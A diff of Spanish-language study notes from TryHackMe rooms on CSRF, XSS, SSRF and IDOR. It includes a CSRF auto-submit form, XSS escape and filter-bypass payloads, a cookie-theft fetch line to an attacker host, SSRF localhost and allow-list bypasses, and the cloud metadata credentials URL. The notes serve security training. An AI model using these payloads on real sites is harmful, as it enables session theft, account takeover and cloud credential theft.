@@ -23,6 +23,8 @@
 
 ---
 
+<br><br>
+
 <h2>
   <img src="https://cdn-images.tryhackme.com/room-icons/6808d44047ac5684351c94da-1779110941603" width="40px">
   <span>Introducción a la Inyección SQL</span>
@@ -141,177 +143,184 @@ La prevención efectiva de inyección SQL requiere aplicar defensas en profundid
 
 ---
 
+<br><br>
+
 <h2>
   <img src="https://cdn-images.tryhackme.com/room-icons/62a7685ca6e7ce005d3f3afe-1775466711834" width="45px">
   <span>Introducción a CSRF (Falsificación de Solicitudes)</span>
 </h2>
 
-### 2.1 ¿Qué es CSRF?
-CSRF (Cross-Site Request Forgery) es una vulnerabilidad de control de acceso que engaña al navegador de un usuario autenticado para que ejecute acciones no deseadas en una aplicación web en la que el usuario tiene una sesión activa.
+<h3> 2.1 Introducción</h3>
+Las aplicaciones web modernas dependen en gran medida de las sesiones autenticadas para realizar acciones en nombre de los usuarios. Cuando inicias sesión en un sitio web, tu navegador almacena una cookie de sesión que permite a la aplicación reconocerte en futuras solicitudes. Si bien esto hace que las aplicaciones web sean convenientes de usar, también crea oportunidades para que los atacantes abusen de esta confianza. Uno de esos ataques es la falsificación de solicitudes entre sitios (CSRF).
 
-El vector fundamental radica en que los navegadores web adjuntan automáticamente todas las cookies pertenecientes al dominio de destino en cada solicitud saliente, independientemente de la página de origen que haya desencadenado dicha petición. Si una aplicación web confía ciegamente en las cookies para autenticar peticiones que cambian el estado del sistema, un atacante puede forzar la ejecución de acciones en nombre de la víctima.
+En lugar de robar credenciales, CSRF engaña al navegador de una víctima para que realice acciones en un sitio web donde la víctima ya está autenticada. Debido a que el navegador incluye automáticamente cookies con las solicitudes, la aplicación web puede tratar la solicitud maliciosa como legítima.
 
-### 2.2 Requisitos para un Ataque CSRF
-Para que una vulnerabilidad CSRF sea explotable, deben cumplirse simultáneamente tres condiciones esenciales en la aplicación web:
+<br>
 
-1. **Una Acción Relevante / Cambio de Estado:** Debe existir una función que modifique datos sensibles en el servidor, como cambiar la dirección de correo electrónico, restablecer la contraseña, transferir fondos o modificar la configuración del perfil.
-2. **Manejo de Sesión Basado en Cookies:** La aplicación autentica las solicitudes únicamente verificando las cookies de sesión adjuntas automáticamente por el navegador.
-3. **Ausencia de Parámetros Impredecibles:** Las solicitudes no contienen valores desconocidos para el atacante (como tokens anti-CSRF aleatorios), permitiendo reconstruir la solicitud exacta con parámetros prefijados.
+<h3> 2.2 ¿Qué es CSRF?</h3>
+CSRF es una vulnerabilidad web en la que un atacante engaña al navegador de un usuario para que envíe una solicitud a un sitio web donde el usuario ya está autenticado. Debido a que el navegador incluye automáticamente cookies de sesión con cada solicitud, la aplicación web asume que la solicitud fue realizada intencionalmente por el usuario.
+<img src="https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1775481672467.png">
 
-### 2.3 Explotación Rápida con Formulario HTML Oculto
-El atacante crea un sitio web malicioso y atrae a la víctima hacia él mediante ingeniería social. Esta página contiene un formulario HTML configurado para apuntar a la URL vulnerable de la aplicación de destino con los datos modificados.
+<br>
+
+<h3>2.2 Cómo funcionan los ataques CSRF</h3>
+Un ataque CSRF típico sigue tres pasos simples:
+1. La víctima inicia sesión en una aplicación web legítima y su navegador almacena una cookie de sesión.
+2. El atacante engaña a la víctima para que visite una página web maliciosa que contiene una solicitud elaborada.
+3. El navegador de la víctima envía automáticamente la solicitud a la aplicación de destino junto con la cookie de sesión almacenada, procesándola el servidor como legítima.
+
+#### - Por qué es peligroso (CONTINUAR AQUI)
+Los ataques CSRF se pueden utilizar para cambiar la dirección de correo electrónico de un usuario, actualizar la configuración de la cuenta, realizar transacciones financieras o modificar preferencias de seguridad sin el consentimiento ni conocimiento de la víctima.
+
+<h3> 2.3 Por qué funciona CSRF</h3>
+La vulnerabilidad no existe porque los navegadores estén rotos, sino porque se comportan exactamente como fueron diseñados. El problema ocurre cuando una aplicación web confía demasiado en las solicitudes.
+
+Cuando un usuario inicia sesión, el servidor envía una cookie de sesión que actúa como tarjeta de identidad. El detalle clave es que el navegador envía automáticamente las cookies asociadas a cada solicitud enviada al mismo dominio, sin importar si la petición se generó desde el sitio legítimo o desde una página maliciosa externa en otro lugar de Internet.
+
+#### Condiciones clave para un ataque CSRF (Key Conditions for a CSRF Attack)
+Para que un ataque CSRF funcione, se deben cumplir tres condiciones principales:
+1. La víctima debe estar autenticada en la aplicación de destino.
+2. La aplicación debe realizar una acción de cambio de estado (modificar datos o configuraciones).
+3. La aplicación no debe verificar si la solicitud proviene de una fuente de confianza.
+
+### 2.4 Identificación de Vulnerabilidades CSRF (Finding CSRF Vulnerabilities)
+Un pentester debe enfocarse en solicitudes que cambian el estado de la aplicación. La pregunta clave a realizarse durante una auditoría es: *¿Se puede activar esta acción sin verificar que la solicitud realmente vino del usuario?*
+
+#### Funciones comunes vulnerables a CSRF (Common Features Vulnerable to CSRF)
+Cambios de correo electrónico, restablecimiento de contraseñas, transferencias de fondos, modificaciones de perfil y actualizaciones de claves API.
+
+#### GET vs POST: Un mito común (GET vs POST - A Common Misconception)
+Muchos desarrolladores asumen que usar el método POST protege automáticamente contra CSRF. Esto es falso. Tanto las solicitudes GET como POST pueden ser abusadas si la aplicación no verifica el origen de la solicitud.
+
+### 2.5 Explotación mediante Formularios HTML (Exploitation using HTML Form)
+#### Práctica y Creación de la Página Maliciosa (Practical & Crafting a Malicious Page)
+En la aplicación StaffHub (`http://staffhub.thm:8080`), la página de configuración permite actualizar el correo electrónico mediante un formulario POST sin tokens anti-CSRF ni mecanismos de verificación de origen.
+
+Un atacante crea una página HTML maliciosa (`settings.html`) alojada en su servidor con un formulario oculto y JavaScript que lo envía automáticamente al cargar la página:
 
 ```html
-<!-- Prueba de Concepto (PoC) de Ataque CSRF por POST -->
-<form action="http://sitio-vulnerable.com/api/change-email" method="POST">
-  <input type="hidden" name="email" value="attacker@evil.com" />
+<form action="http://staffhub.thm:8080/settings" method="POST">
+  <input type="hidden" name="email" value="attacker@evilmail.thm" />
 </form>
 <script>
-  // Envío automático al cargar la página
   document.forms[0].submit();
 </script>
 ```
 
-Cuando la víctima abre el enlace, el script de JavaScript envía el formulario en segundo plano. El navegador incluye automáticamente la cookie de sesión legítima de la víctima y el servidor procesa el cambio de correo correctamente.
-
-### 2.4 Remediación y Prevención
-* **Tokens Anti-CSRF:** Implementar valores aleatorios, criptográficamente seguros e impredecibles generados por el servidor y asociados a la sesión actual. Cada formulario debe incluir este token en un campo oculto y el servidor debe validarlo estrictamente en cada petición de cambio de estado.
-* **Atributos de Cookie `SameSite`:** Configurar las cookies de sesión con `SameSite=Strict` (evita que la cookie se envíe en cualquier petición de origen cruzado) o `SameSite=Lax` (permite el envío solo en navegaciones de nivel superior seguras como enlaces `GET`).
-* **Reautenticación:** Solicitar la contraseña actual del usuario antes de confirmar operaciones críticas como cambios de clave o transferencias bancarias.
-
----
-<br>
-
-<h2>
-  <img src="https://cdn-images.tryhackme.com/room-icons/691e303c8bb7e99b93a58132-1775464376816" width="40px">
-  <span> Introducción a XSS (Scripts en Sitios Cruzados)</span>
-</h2>
-
-### 3.1 ¿Qué es XSS y Causa Raíz?
-Cross-Site Scripting (XSS) es una vulnerabilidad de inyección de código que ocurre cuando una aplicación web incluye datos no confiables proporcionados por el usuario dentro del contenido de una página web enviada al navegador, sin haberlos saneado o codificado previamente.
-
-La causa raíz radica en la falta de separación entre el código de renderizado y los datos de entrada. El navegador web no tiene forma de distinguir si una etiqueta `<script>` o un evento HTML proviene del desarrollador legítimo o de una entrada maliciosa introducida por un atacante, por lo que procede a ejecutar el código JavaScript en el contexto de la sesión de la víctima.
-
-### 3.2 Tipos de XSS
-* **XSS Reflejado (Reflected):** Ocurre cuando la entrada del usuario se incluye inmediatamente en la respuesta HTTP del servidor sin ser almacenada (por ejemplo, en parámetros de búsqueda de la URL o mensajes de error). Requiere que el atacante distribuya un enlace malicioso preparado a la víctima.
-* **XSS Almacenado (Stored / Persistente):** Es la variante más peligrosa. El payload malicioso se guarda permanentemente en la base de datos del servidor (como un comentario en un blog, una reseña de producto o un campo de perfil). Cada vez que cualquier usuario visita la página, el script se ejecuta en su navegador automáticamente.
-* **XSS Basado en DOM (DOM-Based):** Se produce cuando el código JavaScript del cliente lee datos de una fuente manipulable por el usuario (denominada *Source*, como `location.search` o `document.referrer`) y los pasa a una función de ejecución o escritura insegura (denominada *Sink*, como `element.innerHTML` o `eval()`), ejecutándose todo en el navegador sin intervención directa del servidor.
-* **XSS Ciego (Blind XSS):** Es un tipo de XSS almacenado donde el payload se guarda en una zona administrativa que el atacante no puede visualizar (por ejemplo, un formulario de contacto enviado a un panel interno). El código se ejecuta cuando un administrador o empleado de soporte revisa los datos guardados.
-
-### 3.3 Adaptación a Contextos y Payloads de Explotación
-La estructura del payload inyectado debe adaptarse al contexto exacto del código HTML donde la entrada es reflejada:
-
-#### Contexto HTML Plano
-```html
-<!-- Inyección en texto normal entre etiquetas -->
-<script>alert('XSS')</script>
-```
-
-#### Contexto de Atributo HTML
-```html
-<!-- Salir de las comillas del atributovalue y cerrar la etiqueta -->
-"> <script>alert('XSS')</script>
-<img src="x" onerror="alert('XSS')">
-```
-
-#### Contexto de Bloque Textarea o Título
-```html
-<!-- Cerrar la etiqueta contenedora previa -->
-</textarea><script>alert('XSS')</script>
-</title><script>alert('XSS')</script>
-```
-
-#### Contexto dentro de Script Existente
-```html
-<!-- Escapar de la variable JavaScript mediante comillas y punto y coma -->
-'; alert('XSS'); //
-```
-
-#### Robo de Cookies de Sesión (Payload Realista)
-```javascript
-fetch('http://servidor-atacante.com/log?cookie=' + btoa(document.cookie));
-```
-
-### 3.4 Remediación y Prevención
-* **Codificación de Salida (Output Encoding):** Convertir todos los caracteres especiales HTML en sus entidades equivalentes antes de imprimirlos en pantalla (por ejemplo, cambiar `<` por `&lt;`, `>` por `&gt;`, `"` por `&quot;` y `'` por `&#x27;`).
-* **Banderas de Cookie `HttpOnly`:** Configurar el atributo `HttpOnly` en las cookies de sesión para impedir que scripts ejecutados por JavaScript mediante `document.cookie` puedan leer las credenciales de acceso.
-* **Política de Seguridad de Contenidos (CSP):** Implementar encabezados HTTP de CSP (`Content-Security-Policy`) para restringir los dominios desde los cuales se permite cargar y ejecutar scripts, bloqueando la ejecución de JavaScript en línea (*inline scripts*).
+#### ¿Qué sucedió exactamente? (What Exactly Happened?)
+Cuando la víctima autenticada visita el enlace malicioso, su navegador ejecuta el script y envía la solicitud POST al servidor de StaffHub adjuntando automáticamente la cookie de sesión activa. Al carecer de validación de origen, el servidor procesa el cambio y actualiza la dirección de correo a `attacker@evilmail.thm`.
 
 ---
 
-<br>
+## 3. Introducción a XSS (XSS Introduction)
 
-<h2>
-  <img src="https://cdn-images.tryhackme.com/room-icons/268e10b8ee0b53d1074b2a7fd5b1a789.png" width="40px">
-  <span> Introducción a SRF (Falsificación de Solicitudes en el Servidor)</span>
-</h2>
+### 3.1 Introducción y Terminología Importante (Introduction & Important Terminologies)
+El Cross-Site Scripting (XSS) ocurre cuando una aplicación web incluye datos no confiables proporcionados por el usuario dentro de una página web sin filtrarlos o codificarlos previamente, permitiendo la ejecución de JavaScript en el navegador de la víctima.
 
+#### Términos clave:
+- **Document Object Model (DOM):** Representación estructurada en memoria en forma de árbol de una página web que JavaScript puede leer y modificar dinámicamente.
+- **Parámetros URL:** Cadenas de consulta tras el carácter `?` que pasan datos al sitio y deben tratarse siempre como entradas no confiables.
+- **JavaScript:** Lenguaje de script cliente que ejecuta los payloads XSS en el contexto de la página de la víctima.
+- **Cookies y HttpOnly:** Las cookies almacenan datos de sesión. La bandera `HttpOnly` impide que JavaScript pueda leer la cookie mediante `document.cookie`.
+- **Escapado (Output Encoding) vs Filtrado:** Escapar transforma caracteres especiales (`<` a `&lt;`) para que el navegador los trate como texto y no como código ejecutable.
 
-### 4.1 ¿Qué es SSRF y Causa Raíz?
-Server-Side Request Forgery (SSRF) es una vulnerabilidad que permite a un atacante manipular una función de la aplicación web para forzar al servidor backend a realizar peticiones HTTP u otros protocolos hacia direcciones arbitrarias elegidas por el atacante.
+### 3.2 Payloads de XSS (XSS Payloads)
+Un payload XSS es el código JavaScript inyectado. Consta de dos partes:
+1. **Intención:** Lo que el código pretende hacer (demostrar PoC, robar cookies de sesión, registrar pulsaciones de teclas o ejecutar acciones de lógica de negocio).
+2. **Arreglo/Ajuste:** Adaptación del payload según el contexto HTML donde se refleja la entrada.
 
-La causa raíz es la confianza implícita que tienen los sistemas backend en las peticiones que se originan dentro de su propio perímetro de red. La aplicación recibe un parámetro con una dirección URL (por ejemplo, al importar un perfil mediante avatar, descargar un archivo remoto o consumir un webhook) y realiza la solicitud desde su propia dirección IP sin validar el destino.
+#### Pruebas y Ejemplos de Intención
+- **Prueba de concepto básica:** `<script>alert('XSS')</script>`.
+- **Robo de sesión:** `fetch('http://attacker.com/log?cookie=' + btoa(document.cookie))`.
+- **Keylogger:** Registro de eventos de teclado mediante listeners JS.
+- **Lógica de negocio:** Ejecución involuntaria de funciones JS internas de la aplicación (ej. `user.changeEmail()`).
 
-### 4.2 Tipos e Impacto en Entornos Cloud
-* **SSRF Regular (In-Band):** La respuesta completa del recurso interno solicitado se devuelve y muestra directamente en la interfaz de usuario de la aplicación web.
-* **SSRF Ciego (Blind SSRF):** La petición HTTP saliente se realiza con éxito hacia el objetivo, pero la aplicación no devuelve la respuesta en la pantalla. Debe verificarse la vulnerabilidad mediante monitoreo de conexiones recibidas en un servidor controlado externamente (Out-of-Band) o midiendo diferencias en el tiempo de procesamiento.
+### 3.3 XSS Reflejado - No Persistente (Reflected XSS - Non-Persistent)
+Ocurre cuando la entrada del usuario (en parámetros de URL o búsquedas) se refleja inmediatamente en la respuesta de la página web sin sanear. Requiere que la víctima haga clic en un enlace preparado por el atacante.
+- **Causa Raíz:** Pasar parámetros no confiables (ej. `request.args.get("q")`) directamente a plantillas que renderizan HTML no escapado.
 
-#### Impacto en la Nube y Redes Internas
-El impacto más crítico de SSRF incluye el escaneo de puertos en la red interna, el acceso a servicios locales restringidos (como interfaces administrativas de Redis, Memcached o ElasticSearch sin clave) y el robo de credenciales de infraestructura cloud mediante la API de metadatos accesible en la dirección IP no enrutable `169.254.169.254`:
+### 3.4 XSS Almacenado - Persistente (Stored XSS - Persistent)
+Ocurre cuando la entrada maliciosa se guarda permanentemente en la base de datos (sección de comentarios, libros de visitas, biografías de perfil) y se sirve a cada usuario que visita la página.
+- **Causa Raíz:** Almacenar la entrada sin filtrar y utilizar marcas de renderizado seguro desactivado (ej. `{{ comment|safe }}` en Jinja2/Flask).
 
-```bash
-# Extracción de metadatos y credenciales IAM en AWS
-http://169.254.169.254/latest/meta-data/iam/security-credentials/
-```
+### 3.5 XSS Basado en DOM - Lado del Cliente (DOM-Based XSS - Client Side)
+Ocurre cuando el código JavaScript del cliente lee datos controlables por el usuario desde una fuente del DOM (*Source*, como `location.search` o `location.hash`) y los escribe en un punto de ejecución inseguro (*Sink*, como `innerHTML` o `eval()`). La carga útil no necesita tocar el servidor backend.
 
-### 4.3 Técnicas de Elusión y Bypasses de Filtros
-Cuando los desarrolladores aplican listas de denegación (*blacklists*) para bloquear `127.0.0.1` o `localhost`, existen múltiples técnicas para eludir las restricciones:
+### 3.6 XSS Ciego (Blind XSS)
+Variante del XSS almacenado donde el payload se guarda pero se ejecuta en un panel administrativo o portal privado al que el atacante no tiene acceso visual (ej. tickets de soporte vistos por empleados).
+- **Metodología de prueba:** Inyectar un payload con una llamada saliente HTTP/DNS hacia un listener controlado (ej. Netcat `nc -nlvp 9001` o XSS Hunter Express) que capture `document.cookie` y la URL interna del panel.
 
-* **Representaciones de IP Equivalentes:**
-  * IP abreviada con ceros: `http://127.1` o `http://0`
-  * Representación Decimal: `http://2130706433`
-  * Representación Octal: `http://0177.0.0.1`
-  * Dirección IPv6 local: `http://[::1]` o `http://[0:0:0:0:0:0:0:1]`
-* **Dominios DNS Comodín:** Utilizar servicios de resolución DNS pública que apuntan directamente a bucle local, como `http://127.0.0.1.nip.io` o `http://spoofed.burpcollaborator.net`.
-* **Credenciales de URL con el Carácter `@`:** Incluir un dominio legítimo antes del símbolo `@` para confundir al validador de cadenas: `https://dominio-permitido.com@127.0.0.1`.
-* **Encadenamiento con Redirecciones Abiertas (Open Redirects):** Si el servidor valida que el dominio inicial es de confianza pero sigue redirecciones `302`, apuntar a un script en un servidor de confianza que redirija hacia `http://127.0.0.1`.
-
-### 4.4 Remediación y Prevención
-* **Listas de Permitidos (Allow Lists):** Restringir la resolución e interacción de la aplicación únicamente a un conjunto de nombres de dominio y esquemas de red (`http`, `https`) explícitamente autorizados.
-* **Deshabilitar el Seguimiento de Redirecciones:** Impedir que el cliente HTTP backend siga automáticamente respuestas `301` o `302` hacia destinos internos no verificados.
-* **Validación de Direcciones IP Resolvedoras:** Analizar la dirección IP resultante tras la resolución DNS antes de realizar la petición HTTP final, asegurando que no pertenezca a rangos privados (`127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`).
+### 3.7 Perfeccionamiento del Payload (Perfecting your Payload)
+Adaptación según la estructura del código fuente reflejado (Laboratorio de Niveles 1 al 6):
+- **Nivel 1 (HTML Plano):** `<script>alert('THM')</script>`
+- **Nivel 2 (Atributo de etiqueta `<input value="...">`):** Escapar con `"> <script>alert('THM')</script>`
+- **Nivel 3 (Bloque `<textarea>`):** Escapar cerrando la etiqueta previa: `</textarea><script>alert('THM')</script>`
+- **Nivel 4 (Dentro de bloque Script existente):** Escapar de la variable JS: `';alert('THM');//`
+- **Nivel 5 (Filtro de palabras como `script`):** Bypassear la eliminación usando etiquetas anidadas: `<scr<script>ipt>alert('THM')</scr<script>ipt>`
+- **Nivel 6 (Filtro de caracteres `<` y `>`):** Inyección mediante eventos de imágenes: `/images/cat.jpg" onload="alert('THM');`
+- **Políglotas XSS:** Cadenas diseñadas para romper múltiples contextos simultáneamente.
 
 ---
 
-<br>
+## 4. Introducción a SSRF (Intro to SSRF)
 
-<h2>
-  <img src="https://cdn-images.tryhackme.com/room-icons/92b349206a2901c187e32ad074eae45c.png" width="40px">
-  <span> Referencias Directas Inseguras a Objetos (IDOR)</span>
-</h2>
+### 4.1 Introducción y ¿Qué es SSRF? (Introduction & What is SSRF?)
+Server-Side Request Forgery (SSRF) es una vulnerabilidad que permite a un atacante forzar a la aplicación del lado del servidor a realizar solicitudes HTTP hacia un destino de su elección (servicios internos, endpoints de metadatos en la nube o servidores externos).
 
-### 5.1 ¿Qué es IDOR? Autenticación vs. Autorización
-IDOR (Insecure Direct Object Reference) es un tipo de vulnerabilidad de control de acceso a nivel de objeto que ocurre cuando una aplicación utiliza entradas proporcionadas por el usuario para acceder directamente a un recurso o registro en el almacenamiento backend, sin realizar verificaciones suficientes para asegurar que el usuario actual tiene permisos sobre ese recurso.
+SSRF explota la confianza implícita que los sistemas backend otorgan a las peticiones originadas desde la IP interna del servidor de aplicaciones, omitiendo autenticaciones adicionales.
 
-La distinción clave radica en diferenciar **Autenticación** (mecanismo que comprueba quién es el usuario mediante credenciales de inicio de sesión) de **Autorización** (mecanismo que valida si el usuario autenticado tiene el derecho específico de leer, editar o eliminar un recurso determinado). En un IDOR, el sistema reconoce quién eres, pero no valida si el objeto solicitado te pertenece.
+#### Tipos de SSRF
+- **SSRF Regular:** La respuesta del recurso interno se muestra directamente en la respuesta HTTP recibida por el usuario.
+- **SSRF Ciego (Blind SSRF):** El servidor realiza la solicitud pero no devuelve el contenido. Se confirma mediante registros en listeners externos (Burp Collaborator, `python3 -m http.server`) o análisis de diferencias de tiempos de respuesta.
 
-### 5.2 Tipos de Identificadores
-Los identificadores directos se presentan bajo distintos formatos según la arquitectura de la aplicación:
+#### Impacto
+Acceso a paneles de administración internos, exposición de datos sensibles, reconocimiento de red privada y robo de credenciales en la nube mediante el endpoint de metadatos de instancia `169.254.169.254` (AWS, GCP, Azure).
 
-* **Identificadores Secuenciales o Numéricos:** Parámetros sencillos como `?user_id=105` o `?invoice=1002`. Son los más vulnerables a ataques de fuerza bruta mediante la modificación secuencial de números.
-* **Identificadores Codificados (Base64):** Identificadores como `eyJ1c2VyX2lkIjogNX0=`. Al decodificar la cadena se revela un valor en texto plano (`{"user_id": 5}`), permitiendo alterar la cifra, recodificarla en Base64 y reenviarla.
-* **Identificadores Hasheados (MD5 / SHA-1):** Se genera un hash a partir de un entero conocido. Si el usuario detecta que la clave es `md5(100)`, basta con calcular el hash de `101` para intentar acceder al recurso de otra persona.
-* **UUIDs e Identificadores Impredecibles:** Cadenas complejas tipo `a1b2c3d4-e5f6-7890-abcd-ef1234567890`. Aunque no son adivinables de forma secuencial, pueden ser vulnerables si la aplicación los expone en otras secciones públicas o mediante la **Técnica de Auditoría de Dos Cuentas** (obtener el UUID del usuario A e intentar consumirlo estando autenticado con la sesión del usuario B).
+### 4.2 Ejemplos de Vectores SSRF (SSRF Examples)
+1. **URL completa en un parámetro:** `?url=https://server.website.thm/api/item`. Se reemplaza por `?url=http://127.0.0.1/admin`.
+2. **URL parcial (Solo nombre de host o ruta):** Modificación del parámetro de servidor para apuntar a dominios del atacante.
+3. **Path Traversal en la URL:** Uso de `/../admin` cuando solo se controla un segmento de la ruta.
+4. **Campos de formulario ocultos:** Modificación de rutas de avatares o archivos almacenados en campos `<input type="hidden">`.
 
-### 5.3 Ubicaciones de Auditoría durante el Examen o Auditoría
-Durante la revisión de una aplicación web, los IDOR deben probarse en todos los puntos donde se intercambien identificadores de recursos:
+### 4.3 Identificación de SSRF (Finding an SSRF)
+Indicadores comunes en parámetros URL, configuraciones de webhooks, generadores de informes PDF, funciones de vista previa de URLs e importación remota de archivos.
 
-* **Parámetros en la URL y Rutas REST API:** Peticiones tipo `GET /api/v1/users/105/profile` o `GET /download.php?file=105.pdf`.
-* **Cuerpo de Solicitudes POST, PUT o JSON:** Parámetros ocultos en formularios o arreglos de datos como `{"account_id": "105", "balance": 1000}`.
-* **Encabezados HTTP y Cookies:** Variables almacenadas en cookies de sesión o encabezados personalizados tipo `X-User-Id: 105`.
-* **Minería de Parámetros (Parameter Mining):** Agregar parámetros no mostrados en el diseño gráfico (por ejemplo, añadir `?user_id=1` a una llamada API que normalmente no lo especifica).
+### 4.4 Anulación de Defensas Comunes de SSRF (Defeating Common SSRF Defenses)
+#### Bypasses de Listas de Denegación (Deny Lists)
+Elusión de bloqueos de `127.0.0.1` o `localhost`:
+- Formato Abreviado: `127.1` o `0`
+- Formato Decimal: `2130706433`
+- Formato Octal: `017700000001`
+- IPv6: `[::1]`
+- DNS Comodín: Uso de dominios como `127.0.0.1.nip.io`
 
-### 5.4 Remediación y Prevención
-* **Autorización a Nivel de Objeto:** Implementar verificaciones obligatorias en el servidor antes de devolver o modificar un recurso (`SI usuario_actual.id == objeto_solicitado.propietario_id`).
-* **Uso de Referencias Indirectas:** Mapear los identificadores reales de la base de datos a claves temporales específicas de la sesión del usuario actual (por ejemplo, mapear la factura real `1005` a la clave local `1` en la sesión activa).
-* **Control de Acceso Basado en Roles (RBAC):** Definir políticas centralizadas de permisos para restringir qué roles pueden realizar operaciones de lectura o escritura sobre clases de datos particulares.
+#### Bypasses de Listas de Permitidos (Allow Lists)
+- Coincidencia de subdominios: `https://website.thm.attacker.com`
+- Abuso de credenciales de URL con `@`: `https://website.thm@attacker.com`
+
+#### Redirecciones Abiertas (Open Redirects)
+Encadenamiento de un endpoint interno con redirección abierta `302` para eludir restricciones de dominio de origen.
+
+---
+
+## 5. Referencias Directas Inseguras a Objetos (IDOR)
+
+### 5.1 ¿Qué es un IDOR? (What is an IDOR?)
+IDOR (Insecure Direct Object Reference) es una vulnerabilidad de control de acceso que ocurre cuando una aplicación utiliza una referencia directa suministrada por el usuario (un número o cadena) para recuperar un objeto de la base de datos sin comprobar si el usuario actual tiene autorización sobre dicho objeto.
+
+Está clasificada en la posición #1 del OWASP Top 10 (Broken Access Control) y bajo el nombre BOLA (Broken Object Level Authorization) en la API Top 10 de OWASP.
+
+#### Ejemplo de IDOR
+Navegar a `https://sitio.com/profile?user_id=1305` y cambiar el parámetro a `user_id=1000`. Si se muestra la información privada del otro usuario, existe IDOR. La causa es que la aplicación valida la **Autenticación** (sabe quién eres) pero omite la **Autorización** (no valida si tu sesión es dueña del registro `1000`).
+
+### 5.2 Descubrimiento de IDORs según el formato del identificador
+1. **Identificadores Codificados (Encoded IDs):** Uso de Base64 (`eyJ1c2VyX2lkIjogNX0=`). El flujo de explotación requiere: Decodificar (`echo 'valor' | base64 -d`) $\rightarrow$ Modificar el ID $\rightarrow$ Recodificar (`echo 'valor' | base64`) $\rightarrow$ Reenviar la petición.
+2. **Identificadores Hasheados (Hashed IDs):** Uso de MD5 (32 caracteres), SHA-1 (40 caracteres) o SHA-256 (64 caracteres) sobre enteros predecibles. Se calculan hashes de valores secuenciales o se usan tablas de búsqueda como CrackStation.
+3. **Identificadores Impredecibles / UUIDs:** UUIDs como `d3b07384-d9a0-4e9b-8b3c-2f1a6c7e4a90`. Se aplica la **Técnica de Auditoría de Dos Cuentas** (obtener el UUID del usuario A e intentarlo consumir autenticado con el usuario B).
+
+### 5.3 Dónde se localizan los IDORs (Where are IDORs located)
+- **Solicitudes de antecedentes (AJAX / REST APIs):** Peticiones HTTP asíncronas visibles en la pestaña Red del navegador o Burp Suite (`/api/v1/customer?id=15`).
+- **Archivos JavaScript:** Análisis de código cliente para descubrir endpoints de API y nombres de parámetros ocultos.
+- **Minería de parámetros (Parameter Mining):** Agregar parámetros no expuestos en la interfaz gráfica (`?user_id=123`) a peticiones que normalmente no los solicitan.
+- **Ubicaciones comunes:** Parámetros de URL, cuerpo POST/JSON, cookies, encabezados HTTP personalizados y segmentos de ruta REST (`/api/users/123/orders`).
+
